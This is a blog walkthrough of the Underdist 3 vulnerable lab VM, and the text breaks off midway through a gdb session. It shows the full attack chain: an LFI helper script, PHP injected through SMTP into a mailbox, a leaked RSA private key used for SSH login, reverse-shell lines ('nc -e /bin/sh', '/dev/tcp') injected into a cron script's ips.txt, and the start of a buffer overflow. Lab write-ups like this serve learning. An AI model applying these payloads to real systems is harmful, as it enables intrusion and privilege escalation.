---
title: "underc0de 3 WalkThrough"
date: 2014-12-03T10:37:59+00:00
url: "/underc0de-3-walkthrough/"
draft: false
description: "loaded the virtual machine and run netdiscover to get the machine IP x.112 is the target so let's see what ports available apache is on :D so let's brute force..."
categories: ["Bash", "blog", "Databases", "exploit-dev", "Firewall", "Python", "Security", "tech", "Web"]
image: "/uploads/2014/12/Screen-Shot-2014-12-03-at-7.07.00-AM.png"
---

loaded the virtual machine

and run netdiscover to get the machine IP

```bash
oot@n1x:~# netdiscover
 Currently scanning: 192.168.39.0/16   |   Screen View: Unique Hosts

 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240
 _____________________________________________________________________________
   IP            At MAC Address      Count  Len   MAC Vendor
 -----------------------------------------------------------------------------
 192.168.1.1     e8:94:f6:5d:c6:3b    01    060   Unknown vendor
 192.168.1.2     00:18:fe:6d:61:27    01    060   Hewlett Packard
 192.168.1.100   6c:40:08:98:68:d4    01    060   Unknown vendor
 192.168.1.112   00:0c:29:fb:62:53    01    060   VMware, Inc.
```

x.112 is  the target

 

so let's see what ports available

```bash
root@n1x:~# nmap -sSV -p1-9999 192.168.1.112

Starting Nmap 6.47 ( http://nmap.org ) at 2014-12-01 02:49 EST
Nmap scan report for 192.168.1.112
Host is up (0.00019s latency).
Not shown: 9996 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 6.0p1 Debian 4+deb7u2 (protocol 2.0)
25/tcp open  smtp    Postfix smtpd
80/tcp open  http    Apache httpd 2.2.22 ((Debian))
MAC Address: 00:0C:29:FB:62:53 (VMware)
Service Info: Host:  Underdist; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

apache is on :D

![Screen Shot 2014-12-03 at 7.07.00 AM](/uploads/2014/12/Screen-Shot-2014-12-03-at-7.07.00-AM.png)

so let's brute-force the directory in the server

```bash
root@n1x:~# dirb http://192.168.1.112

-----------------
DIRB v2.21
By The Dark Raver
-----------------

START_TIME: Mon Dec  1 02:49:57 2014
URL_BASE: http://192.168.1.112/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4592

---- Scanning URL: http://192.168.1.112/ ----
==> DIRECTORY: http://192.168.1.112/ascii/
+ http://192.168.1.112/cgi-bin/ (CODE:403|SIZE:289)
+ http://192.168.1.112/index (CODE:200|SIZE:1254)
+ http://192.168.1.112/index.html (CODE:200|SIZE:1254)
+ http://192.168.1.112/server-status (CODE:403|SIZE:294)
```

also seems developer commented a line in the HTML code

http://192.168.1.112/ascii/letras/ folder inside
http://192.168.1.112/ascii/letras/ascii1.txt  ASCII file

index and index.html is the same

```html
<!--<a href="v.php?a=YXNjaWkxLnR4dA==">foo</a>-->
```

seems base64 let's decode it

```python
>>> "YXNjaWkxLnR4dA==".decode('base64')
'ascii1.txt'
>>>
```

yes we have a folder called ascii too

after visit http://192.168.1.112/v.php?a=YXNjaWkxLnR4dA==

it shows ascii 404 error code

this content same content inside http://192.168.1.112/ascii/letras/ascii1.txt

so v.php do a file include for the  ascii1.txt with base64 encoded names

so let's try to include /etc/passwd

after trying u will figure it need 4 ../ to go to /etc/passwd

that's mean

1 letras folder 2 ascii 3 www 4 var

so it Debian family server :D

http://192.168.1.112/v.php?a=Li4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
dovecot:x:102:106:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:103:65534:Dovecot login user,,,:/nonexistent:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
debian-spamd:x:105:107::/var/lib/spamassassin:/bin/sh
underdist:x:1000:1000:underdist,,,:/home/underdist:/bin/bash
postfix:x:106:109::/var/spool/postfix:/bin/false
cuervo:x:1001:1001:,,,:/home/cuervo:/bin/bash
smmta:x:107:111:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:108:112:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
```

 

users with bash

root,underdist,cuervo

so let's write an easy tool to save our time

I need to enter path name and it encodes it

then return the base64 link

and go visit it and return the content of the page

```python
root@n1x:~# cat url2base64.py
import readline
import urllib2
link = "http://192.168.1.112/v.php?a="
while True:
	url = "../../../../"
	url += raw_input("enter path to encode>>")
	target = link + url.strip().encode('base64')
	print target
	try:
		response = urllib2.urlopen(target)
	except:
		print "Server Error"
		continue
	page = response.read()
	print page
```

 

```
nix@OSX:[~]: python url2base64.py
enter path to encode>>/etc/passwd
http://192.168.1.112/v.php?a=Li4vLi4vLi4vLi4vL2V0Yy9wYXNzd2Q=

<html>
<head>
<style type="text/css">
body {text-align:center;
      font-size:15px;}
</style>
</head>
<body>
<br />
<br />
<br />
<br />
<pre>
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/bin/sh
bin:x:2:2:bin:/bin:/bin/sh
sys:x:3:3:sys:/dev:/bin/sh
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/bin/sh
man:x:6:12:man:/var/cache/man:/bin/sh
lp:x:7:7:lp:/var/spool/lpd:/bin/sh
mail:x:8:8:mail:/var/mail:/bin/sh
news:x:9:9:news:/var/spool/news:/bin/sh
uucp:x:10:10:uucp:/var/spool/uucp:/bin/sh
proxy:x:13:13:proxy:/bin:/bin/sh
www-data:x:33:33:www-data:/var/www:/bin/sh
backup:x:34:34:backup:/var/backups:/bin/sh
list:x:38:38:Mailing List Manager:/var/list:/bin/sh
irc:x:39:39:ircd:/var/run/ircd:/bin/sh
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/bin/sh
nobody:x:65534:65534:nobody:/nonexistent:/bin/sh
libuuid:x:100:101::/var/lib/libuuid:/bin/sh
Debian-exim:x:101:104::/var/spool/exim4:/bin/false
dovecot:x:102:106:Dovecot mail server,,,:/usr/lib/dovecot:/bin/false
dovenull:x:103:65534:Dovecot login user,,,:/nonexistent:/bin/false
sshd:x:104:65534::/var/run/sshd:/usr/sbin/nologin
debian-spamd:x:105:107::/var/lib/spamassassin:/bin/sh
underdist:x:1000:1000:underdist,,,:/home/underdist:/bin/bash
postfix:x:106:109::/var/spool/postfix:/bin/false
cuervo:x:1001:1001:,,,:/home/cuervo:/bin/bash
smmta:x:107:111:Mail Transfer Agent,,,:/var/lib/sendmail:/bin/false
smmsp:x:108:112:Mail Submission Program,,,:/var/lib/sendmail:/bin/false
</pre>
</body>
</html>

enter path to encode>>
```

I need to make remote command execute from  local file include

trying to include any log files I can inject shellcode in it

I did try everything in /var/log but seems no hope

trying to brute force ssh user underdist via hydra

but it won't work  after digging the ssh server

```
debug1: Trying private key: /root/.ssh/id_rsa
debug1: read PEM private key done: type RSA
debug3: sign_and_send_pubkey: RSA 93:bd:d8:ad:83:8b:0f:0d:44:42:2b:d8:4e:25:18:36
debug2: we sent a publickey packet, wait for reply
debug1: Authentications that can continue: publickey
debug1: Trying private key: /root/.ssh/id_dsa
debug3: no such identity: /root/.ssh/id_dsa
debug1: Trying private key: /root/.ssh/id_ecdsa
debug3: no such identity: /root/.ssh/id_ecdsa
debug2: we did not send a packet, disable method
debug1: No more authentication methods to try.
Permission denied (publickey).
```

it only accepts RSA keys to login

so the key somewhere.....

why it installed with mailserver this is a point

let's send some emails

```bash
root@n1x:~# nc 192.168.1.112 25
220 Underdist ESMTP Postfix (Debian/GNU)
helo underdist
250 Underdist
mail from:n1x@unixawy.com
250 2.1.0 Ok
rcpt to:underdist
250 2.1.5 Ok
data
354 End data with <CR><LF>.<CR><LF>
test route
.
250 2.0.0 Ok: queued as E3D978533
```

mail server works as the  mail queue

and it says the user exists

mailbox can be included !!!!!!!!!!!!!!!!!!!!!!!!!

trying http://192.168.1.112/v.php?a=Li4vLi4vLi4vLi4vL3Zhci9tYWlsL3VuZGVyZGlzdA==

ERROR 500: Internal Server Error

we are in Debian server and apache2 runs via www-data ! it could have read permission

trying some email with

system , exec, shell_exec but  nothing of them works

seems all this functions disabled

trying phpinfo to get sure and it works

so lets list the dir   with some native php

```
220 Underdist ESMTP Postfix (Debian/GNU)
HELO ckjdshcjk
250 Underdist
MAIL FROM: local
250 2.1.0 Ok
RCPT TO: www-data
250 2.1.5 Ok
DATA
354 End data with <CR><LF>.<CR><LF>
<?php $dir = '.'; $data=scandir($dir);print_r($data); ?>
.
250 2.0.0 Ok: queued as 4E30F8534
```

 

```
Array
(
    [0] => .
    [1] => ..
    [2] => ascii
    [3] => b_gd214dg
    [4] => index.html
    [5] => v.php
)
```

 

 

it's work and files listed

what this folder b_gd214dg

there is rsa privte key inside it http://192.168.1.112/b_gd214dg/foo.backup

```
-----BEGIN RSA PRIVATE KEY-----
MIIEowIBAAKCAQEAz+YDrVu42bSrE+ryW4aGxAmTBs4PZvWvsLrLbibfo2cAEM3W
/0ZP1emISX7mUUW6cNfIqF+M/bkng4A0977UCIRPzPaQPHItjwDBqArHzPb0EPuc
bi70DybOsN/OIV8L1lCq45rmrwiAxC6eCtmcW+ExqsLJw98uTIUpuPQ/vu3XOiV1
leOeP2Fh5k1TYV6wg/HWemux7Z9aC8iaLkZ6wsM4s4uOdU7eiPh/6SH3ZEmusNKp
KjoxU8jSq6x/1tbMYfwp6YwCOGmtzKfQQRMqGk9V130vbfGcKALHV79qdsSCIcLI
CiGRc99Eh5k7fHVILx2VchCkktoeZc6Tou7mWQIDAQABAoIBABWidheASAg/yN3V
wUrNARE9fdNjdi7cul/F0I2x9evnOBaHlSwTgRNdrhUX45fpjbFYg0UiTGXK8tW4
bcqqTR5lxngp4HCp4RvUlFKMbKZjvJpX1LuSn0tEWpYFdEn8vhqbYm01HXRxihTg
VQoEA0V8ddKzWpPLkeHcqa7ZnBieL126vskEIZVmteorSAfRiwsYpH4zyLoT7xIt
DKABFiuKWuxoNjL30NAjvAJtdlhPrZhDhFNYF6O63/nGxTbeKg7qyHJgg7XsINz6
02z5T63uzhq767mShKtxnV+uyRlRmYLF3tdrhDf3arpHbd7z7K+/5HAY/r6EKhGB
wu8ujRECgYEA/jZxc7wxCx7c+mvqQe3E6MJgmNQhYKNVoTi83EJat5jWPA8GFXlr
AYTzYSy5KThGpqoUi1cJV2gT73LmoCzjTI07tGWL6L0VUjsceREkP0mBj0Zq8D+9
C+QSXkeC1UcIP/F1tpsW1AyjrlfeN4pbtQw3eoNNpCQhIRyfXAcfH7sCgYEA0Vw1
3V+rRSS11ABF2268qDOKWXhVxNVMiBkCelDnxuTWrDXlUYazOVuI8XXvdTfymATm
LvwD2G0J4bIjc/J+zPdBAijTRwjsgHaHklo/OJ62M4PuuErzA/RtAFzOMhX1giMc
gpiLR2hMJt04FPkW4rnstGIFQoPvK55S74C6vvsCgYBASAwQM/pC0Z8XQ8qMuU8d
fGlou9tk0GiKyAoZuD2wR1mE/lePfpBsZe4VGHYJ0k0rP77KLUwTaiIAXpGq1y7y
4JPEXhku1QFbNc9RXeBIkJHOZQQNlFB9fUKXzIVs4PVZFfmqHzV6kWeiYl2yta3S
7i/pLuKnKuulr9MsNjDMmQKBgQCjhmeYOqJ3Bj5zkab+xxbaNi+oxIIRlR0K7KXv
zgPLaXB34Dz2mcShV2q2VwyrPQDiVmlIZ5XFVR2zyMVCSjVaeQGw4xxrToATswEf
ghgBbI4Z3MH39qqr+x2se9CedGJnvG8HXojjRIa+kGm+j/SdMOW+2xUKqCyGoEpd
QeobQwKBgFhwph+eDPJFG+gNhDkH8xCebIo1n1deYdbUSXgeBzKpZ7PRbhuHiwQ4
orJfIQ1p36pShXtT6SINRO5B/s1jXVwDTEc0ISsdwwpOpNHlSRUJg2d2S1bAH+TO
w3WLPIahFHMy0GVmfSngkbEAJjVmqOHIH3Q0A/pfJaGztQL7okOt
-----END RSA PRIVATE KEY-----
```

 

sure we can use this key to login in ssh

trying to login via key

ssh -i foo.backup underdist@192.168.1.112 -vvvvvv

seems the key invalid .. : -s

trying the other users

```
nix@OSX:[~]: ssh -i foo.backup cuervo@192.168.1.112
Linux Underdist 3.2.0-4-486 #1 Debian 3.2.63-2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
Last login: Wed Dec  3 04:53:33 2014 from 192.168.1.100
cuervo@Underdist:~$
```

the home directory is empty

```bash
cuervo@Underdist:~$ ls -alh
total 24K
drwx------ 3 cuervo cuervo 4.0K Oct 27 12:56 .
drwxr-xr-x 4 root   root   4.0K Oct 21 21:51 ..
lrwxrwxrwx 1 root   root      9 Oct 27 08:54 .bash_history -> /dev/null
-rw------- 1 cuervo cuervo  220 Oct 21 21:51 .bash_logout
-rw------- 1 cuervo cuervo 3.4K Oct 21 21:51 .bashrc
-rw------- 1 cuervo cuervo  675 Oct 21 21:51 .profile
drwx------ 2 cuervo cuervo 4.0K Dec 31  2001 .ssh
```

but seems i can list the underdist user

```bash
cuervo@Underdist:~$ ls -al  /home/underdist/
total 40
drwxr-xr-x 4 underdist underdist 4096 Oct 27 11:55 .
drwxr-xr-x 4 root      root      4096 Oct 21 21:51 ..
lrwxrwxrwx 1 root      root         9 Oct 27 08:54 .bash_history -> /dev/null
-rw------- 1 underdist underdist  220 Oct 21 21:12 .bash_logout
-rw------- 1 underdist underdist 3392 Oct 21 21:12 .bashrc
drwx------ 2 underdist underdist 4096 Oct 27 12:56 .bin
-rw------- 1 underdist underdist   10 Oct 27 11:47 .nano_history
-rw------- 1 underdist underdist  675 Oct 21 21:12 .profile
drwx------ 2 underdist underdist 4096 Oct 27 11:55 .ssh
-rwxr-xr-x 1 underdist underdist  541 Oct 27 11:46 cronping.py
-rwxrwxrwx 1 underdist underdist   80 Oct 27 13:12 ips.txt
cuervo@Underdist:~$ ls -al /root/
ls: cannot open directory /root/: Permission denied
```

what is new here is

cronping.py ips.txt .bin

seems i can't access bin folder

but ips.txt is writable

lets see the python file

```python
cuervo@Underdist:/home/underdist$ cat cronping.py
#!/usr/bin/env python

import os

def ips():
    f=open("ips.txt")
    return f

def save(d):
    f=open("/tmp/logs", "a+")
    f.write(d)
    f.close()

def command(c):
    p=os.popen('ping -c 1 -w 1 %s|grep received|cut -d " " -f 4' % (c), "r")
    return p.read()

def verify():
    save("- - - - - - - - - - - - - - - - - - - - - - - - -\n")
    for ip in ips():
        ip=ip.replace("\n", "")
        if command(ip)=="1\n":
            save("Host %s Up\n" % (ip))
        else:
            save("Host %s Down\n" % (ip))

verify()
```

ips function to open ips.txt this file content list of ips

and command function it ping ips and grep txt from out put and some cut with determiner space and print 4th column

it can be hacked as it just read the file and execute it with no ip regex

example: ping -c 1 -w1 4.2.2.2;bash -i >& /dev/tcp/192.168.1.100/1337 0>&1

it should be send us a shell

lets monitor the /tmp/logs and see if  this script really run via cron

```bash
cuervo@Underdist:/home/underdist$ wc -l /tmp/logs
163 /tmp/logs
cuervo@Underdist:/home/underdist$ wc -l /tmp/logs
168 /tmp/logs
cuervo@Underdist:/home/underdist$ wc -l /tmp/logs
```

yes it run around every 10 sec

setting the malicious code after the ip

```bash
cuervo@Underdist:/home/underdist$ cat ips.txt
198.27.100.204;nc -e /bin/sh 192.168.1.100 1337
31.13.85.33
173.194.42.63
23.76.228.226
72.21.81.85
185.12.13.15
cuervo@Underdist:/home/underdist$
```

 

and wait the shell

```bash
root@n1x:~# nc -lvp 1337
listening on [any] 1337 ...
id
uid=1000(underdist) gid=1000(underdist) grupos=1000(underdist),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev)
bash
python -c "import pty;pty.spawn('/bin/bash')"
underdist@Underdist:~$
```

as the only method to communicate via ssh so i added my rsa public key inside the authorized_keys

to  use  the best of bash

```
ssh underdist@192.168.1.112
Linux Underdist 3.2.0-4-486 #1 Debian 3.2.63-2 i686

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
underdist@Underdist:~$
```

nice  we are in and the echo with suid

```bash
underdist@Underdist:~/.bin$ ./echo
Violación de segmento
underdist@Underdist:~/.bin$ ./echo a
a
underdist@Underdist:~/.bin$ ./echo $(python -c "print 'A' * 1024")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
Violación de segmento
underdist@Underdist:~/.bin$
```

segmento amigoooooo :D

checking if any protection before we play

```bash
underdist@Underdist:~/.bin$ bash checksec.sh --file echo
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   echo
underdist@Underdist:~/.bin$
```

seems clean nice

so the app raise overflow for the argv1

lets fire gdb

```
(gdb) disassemble main
Dump of assembler code for function main:
   0x0804844c <+0>:	push   %ebp
   0x0804844d <+1>:	mov    %esp,%ebp
   0x0804844f <+3>:	sub    $0x134,%esp
   0x08048455 <+9>:	mov    0xc(%ebp),%eax
   0x08048458 <+12>:	add    $0x4,%eax
   0x0804845b <+15>:	mov    (%eax),%eax
   0x0804845d <+17>:	mov    %eax,0x4(%esp)
   0x08048461 <+21>:	lea    -0x12c(%ebp),%eax
   0x08048467 <+27>:	mov    %eax,(%esp)
   0x0804846a <+30>:	call   0x8048320 <strcpy@plt>
   0x0804846f <+35>:	lea    -0x12c(%ebp),%eax
   0x08048475 <+41>:	mov    %eax,(%esp)
   0x08048478 <+44>:	call   0x8048330 <puts@plt>
   0x0804847d <+49>:	mov    $0x0,%eax
   0x08048482 <+54>:	leave
   0x08048483 <+55>:	ret
End of assembler dump.
(gdb)
```

it call strcpy and this is our poor function :D

```
0x0804846a <+30>:	call   0x8048320 <strcpy@plt>
```

so lets see what in the registers

```
(gdb) r $(python -c "print 'A' * 1024")
Starting program: /home/underdist/.bin/echo $(python -c "print 'A' * 1024")
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()
(gdb) info registers
eax            0x0	0
ecx            0xb7fd64c0	-1208130368
edx            0xb7fd7340	-1208126656
ebx            0xb7fd5ff4	-1208131596
esp            0xbffff340	0xbffff340
ebp            0x41414141	0x41414141
esi            0x0	0
edi            0x0	0
eip            0x41414141	0x41414141
eflags         0x10246	[ PF ZF IF RF ]
cs             0x73	115
ss             0x7b	123
ds             0x7b	123
es             0x7b	123
fs             0x0	0
gs             0x33	51
(gdb)
```

nice we control the eip register

```
eip            0x41414141	0x41414141
```

and the rest of data overflow the ebp too

```
ebp            0x41414141	0x41414141
```

 

so lets find the correct offset

```x86asm
root@n1x:~# locate pattern_create
/usr/share/metasploit-framework/tools/pattern_create.rb
root@n1x:~# ruby /usr/share/metasploit-framework/tools/pattern_create.rb 1024
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B
```

 

```x86asm
(gdb) r $(python -c "print 'Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0B'")
The program being debugged has been started already.
Start it from the beginning? (y or n) y

